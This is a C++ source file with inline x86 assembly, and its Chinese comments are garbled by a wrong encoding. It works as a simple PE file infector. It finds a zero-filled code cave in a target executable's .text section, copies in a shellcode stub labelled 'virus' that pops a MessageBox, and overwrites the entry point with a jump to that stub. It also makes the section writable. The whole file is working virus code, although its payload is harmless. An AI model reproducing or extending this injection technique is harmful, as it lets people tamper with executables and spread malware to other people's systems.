// Win-�����ת����.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include<windows.h>
#include<cstdio>

const int PEtoEntryPoint = 0x28;//��ڵ������PEͷ��ƫ��
const int textCharacteristics = 0x24;
int PEHeadOffset, EntryPoint, textOffset, textRVA, textFO, textSize, textVK, zeroOffset, ImageBase, iVirusSize = 0;
PVOID pvFile = NULL;

char* CreateCode()
{
	int VirusStart, VirusEnd;
	_asm{
		mov VirusStart, offset virus_start
		mov VirusEnd, offset virus_end
	}
	iVirusSize = VirusEnd - VirusStart;
	char* pCode = (char *)malloc(iVirusSize);
	if (NULL == pCode)
	{
		return 0;
	}

	memcpy(pCode, (void *)VirusStart, iVirusSize);
	memcpy(pCode + 5, (PSTR)pvFile + EntryPoint-textVK, 5);//��д��ʼ��ڵ��5�ֽ�����
	*(int *)(pCode + 10) = EntryPoint + ImageBase;//��д��ʼ��ڵ�ַ��VA��
	*(int *)(pCode + 14) = 0x77D507EA;
	strcpy(pCode + 18, "123");
	
	return pCode;

virus_start:
	_asm{
		call yy
		//�����ʼ��ڵ��5�ֽ�����
		nop
		nop
		nop
		nop
		nop
		//�����ʼ��ڵ�ַ
		nop
		nop
		nop
		nop
		//���MessageBox��ڵ�ַ
		nop
		nop
		nop
		nop
		//���"123"�ֽ�,����'\0'��4�ֽ�
		nop
		nop
		nop
		nop

	yy:
		pop eax
		push ebx
		push ecx
		push 0
		mov ebx,eax
		add ebx,13//eax+13��š�123���ֽڵĵ�ַ
		push ebx
		push ebx
		push 0
		mov ebx,eax
		add ebx,9//eax+9���MessageBox�ĵ�ַ
		mov ecx, [ebx]
		mov ebx,eax//��Ϊ����MessageBox֮��eax���ŷ���ֵ�������ȱ���eax
		call ecx//call MessageBox
		//���ﲻ�ü�espƽ���ջ
		mov eax,ebx

		mov ebx,eax
		add ebx,5
		mov ecx, [ebx]//��ʱecx���ԭ��ڵ�ַ

		mov ebx, [eax]
		mov [ecx],ebx//����ǰ4�ֽ�

		add eax,4
		add ecx,4
		mov bl,[eax]
		mov byte ptr[ecx],bl//�������һ���ֽ�

		sub ecx,4

		mov eax,ecx
		pop ecx
		pop ebx
		jmp eax
	}
virus_end:
	;
}
int findZero(PVOID file, int start,int size)//����һ������128�ֽڶ���0������
{
	bool OK = true;
	while (1)
	{
		OK = true;
		for (int i = 0; i < size; i++)
		{
			if (0 != *((PSTR)file + start + i))
			{
				OK = false;
				break;
			}
		}
		if (OK)
		{
			return start;
		}
		else
		{
			start++;
		}
	}
}
int findSection(char *name, PVOID file, int start)//�ҵ�PEͷ������Ϊ*name�����ε�������Ϣ���ļ�ƫ��
{
	//int offset = start;
	bool OK;
	while (1)
	{
		OK = true;
		for (int i = 0; ; i++)
		{
			if (*(name + i) == '\0'&&*((PSTR)file + i + start) == '\0')
				break;
			if (*(name + i) != *((PSTR)file + i + start))
			{
				OK = false;
				break;
			}
		}
		if (OK)
		{
			return start;
		}
		else
		{
			start++; 
		}
	}
}
int _tmain(int argc, _TCHAR* argv[])
{
	TCHAR szBuf[512];
	wscanf_s(L"%ls", szBuf, _countof(szBuf));
	HANDLE hNormalFile = CreateFile(szBuf, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (INVALID_HANDLE_VALUE == hNormalFile)
	{
		printf("���ļ�����,�������%d", GetLastError());
	}
	DWORD dwFileSize = GetFileSize(hNormalFile, NULL);
	HANDLE hFileMap = CreateFileMapping(hNormalFile, NULL, PAGE_READWRITE, 0, dwFileSize, NULL);
	if (NULL == hFileMap)
	{
		printf("�����ڴ�ӳ���ļ�ʧ��,�������%d", GetLastError());
	}
	pvFile = MapViewOfFile(hFileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);
	if (NULL == pvFile)
	{
		printf("ӳ���ļ�ʧ��,�������%d",GetLastError());
	}
	
	PEHeadOffset = *(int *)((PSTR)pvFile + 0x3c);
	EntryPoint = *(int *)((PSTR)pvFile + PEHeadOffset + PEtoEntryPoint);
	//PEͷƫ��0x78��DataDirectory�ֶΣ�DataDirectory�ֶΰ���16����Ϣ��ÿ��8�ֽ�
	//textVK = *(int *)((PSTR)pvFile + PEHeadOffset + 0x78+16*8+)
	textOffset = findSection(".text", pvFile, 0);
	textRVA = *(int *)((PSTR)pvFile + textOffset + 12);//���α�����ʼƫ��12�ֽڴ�Ϊ�����ε�RVA
	textFO = *(int *)((PSTR)pvFile + textOffset + 20);//���α�����ʼƫ��20�ֽڴ�Ϊ�����ε�File Offset
	textSize = *(int *)((PSTR)pvFile + textOffset + 16);//ƫ��16�ֽ�Ϊ���������ļ��ж����ĳߴ�
	textVK = textRVA - textFO;
	ImageBase = *(int *)((PSTR)pvFile + PEHeadOffset + 0x34);
	zeroOffset = findZero(pvFile, textFO,80);//��Ҫ���ƵĴ�����71�ֽ�

	char *code=CreateCode();
	memcpy((PSTR)pvFile + zeroOffset, code, iVirusSize);

	//�޸�ԭ��ڵ㣬��ת����������
	*((PSTR)pvFile + EntryPoint - textVK) = 0xe9;
	*(int *)((PSTR)pvFile + EntryPoint - textVK + 1) = (zeroOffset - textVK) - (EntryPoint - textVK) - 5;

	//�޸�.text��������Ϊ�ɶ���д
	int Characteristics = *(int *)((PSTR)pvFile + textOffset + textCharacteristics);
	Characteristics |= 0x80000000;
	*(int *)((PSTR)pvFile + textOffset + textCharacteristics) = Characteristics;

	UnmapViewOfFile(pvFile);
	return 0;
}

